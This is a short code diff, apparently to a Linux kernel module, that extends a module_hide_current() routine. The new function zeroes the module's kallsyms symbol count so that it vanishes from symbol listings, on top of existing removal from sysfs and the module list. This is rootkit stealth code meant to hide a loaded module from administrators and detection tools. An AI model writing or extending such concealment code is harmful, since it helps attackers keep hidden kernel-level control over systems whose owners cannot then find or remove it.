@@ -34,6 +34,15 @@ static void __sanitize_module_info(struct module *mod)
     mod->sect_attrs = NULL;
 }
 
+static void __remove_symbols_from_kallsyms(struct module *mod)
+{
+    if (mod->kallsyms) {
+        mod->kallsyms->num_symtab = 0;
+        // mod->kallsyms->symtab = NULL;
+        // mod->kallsyms->strtab = NULL;
+    }
+}
+
 notrace void module_hide_current(void)
 {
     struct module *mod = THIS_MODULE;
@@ -47,6 +56,7 @@ notrace void module_hide_current(void)
     __remove_from_sysfs(mod);
     __remove_from_module_list(mod);
     __sanitize_module_info(mod);
+    __remove_symbols_from_kallsyms(mod);
 
     hider_state.hidden = true;
 }
